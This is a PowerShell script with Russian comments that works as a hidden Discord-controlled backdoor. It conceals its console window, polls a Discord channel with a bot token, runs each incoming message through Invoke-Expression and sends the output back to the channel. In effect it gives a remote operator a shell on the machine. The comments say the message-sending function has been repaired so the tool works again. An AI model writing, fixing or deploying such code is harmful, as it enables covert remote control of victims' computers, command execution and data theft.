$token = "$tk"   # берётся из bat-файла
$chan  = "$ch"   # берётся из bat-файла

# =============================================================== SCRIPT SETUP =========================================================================
$response = $null
$previouscmd = $null
$authenticated = 0

# Скрытие окна (оригинал твой, работает)
$hide = 'y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Name Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){ $t::ShowWindowAsync($w,0) | Out-Null }
}

function PullMsg {
    $headers = @{ 'Authorization' = "Bot $token" }
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=10")
        $messages = $json | ConvertFrom-Json
        $last = $messages | Where-Object {!$_.author.bot} | Select-Object -First 1
        if ($last) { $script:response = $last.content.Trim() }
    } catch { }
}

# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
# ЭТО ЕДИНСТВЕННОЕ, ЧТО НАДО БЫЛО ПОЧИНИТЬ — СТАРАЯ sendMsg падала на 400
function sendMsg {
    param([string]$Message)
    if (!$Message) { return }

    # ФИКС №1: экранируем обратные кавычки (главная причина 400)
    $Message = $Message -replace '`', 'ˋ'

    # ФИКС №2: правильный multipart вместо кривого JSON (Discord теперь требует именно так)
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"
    $body = "--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$(@{content=$Message}|ConvertTo-Json -Compress)$LF--$boundary--"

    try {
        Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages" `
            -Method Post `
            -Headers @{ "Authorization" = "Bot $token" } `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body ([text.encoding]::UTF8.GetBytes($body)) `
            -TimeoutSec 10 | Out-Null
    } catch {
        # если совсем не получилось — хотя бы не падаем
    }
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg -Message ":white_check_mark: **$env:COMPUTERNAME** | ``Session Started!`` :white_check_mark:"
        sendMsg -Message "``PS | $($PWD.Path)>``"
    }
}

# =============================================================== MAIN LOOP =========================================================================
PullMsg
$previouscmd = $response
sendMsg -Message ":hourglass: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg -Message ":octagonal_sign: **$env:COMPUTERNAME** | ``Session Closed.`` :octagonal_sign:"
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg -Message ":pause_button: **$env:COMPUTERNAME** | ``Session Paused..`` :pause_button:"
                continue
            }

            # Выполнение команды (твой оригинальный код, он нормальный)
            try { $Result = Invoke-Expression $response -ErrorAction Stop | Out-String }
            catch { $Result = "$($_.Exception.Message)" }

            $lines = ($Result -split "`n").TrimEnd()
            $batch = @()
            $size = 0
            foreach ($line in $lines) {
                $lineBytes = [Text.Encoding]::Unicode.GetByteCount($line)
                if ($size + $lineBytes -gt 1900) {
                    sendMsg -Message "``````$($batch -join "`n")``````"
                    Start-Sleep -Milliseconds 400
                    $batch = @(); $size = 0
                }
                $batch += $line
                $size += $lineBytes
            }
            if ($batch.Count) { sendMsg -Message "``````$($batch -join "`n")``````" }

            sendMsg -Message "``PS | $dir>``"
        }
        else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}
